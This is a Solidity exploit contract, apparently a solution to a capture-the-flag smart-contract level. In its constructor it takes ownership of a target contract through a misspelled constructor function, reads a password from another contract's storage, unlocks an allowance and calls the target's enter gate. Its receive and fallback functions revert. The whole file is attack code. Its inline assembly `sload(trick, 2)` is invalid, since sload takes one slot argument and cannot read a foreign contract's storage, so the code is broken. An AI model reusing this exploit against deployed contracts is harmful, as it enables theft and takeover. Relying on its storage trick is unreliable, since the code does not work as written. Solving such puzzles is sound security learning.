pragma solidity ^0.8.0;

interface IGt {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256) external;
    function enter() external;
    function trick() external view returns (address);
}

contract FinalExploit {
    IGt public immutable target;

    constructor (address payable _target) {
        target = IGt(_target);
        target.construct0r();
        target.createTrick();
        address trick = target.trick();
        uint256 password;
        assembly {
            password := sload(trick, 2)
        }
        target.getAllowance(password);
        // Call enter from this attacker contract, which is now owner
        target.enter();
    }

    receive() external payable {
        revert();
    }

    fallback() external payable {
        revert();
    }
}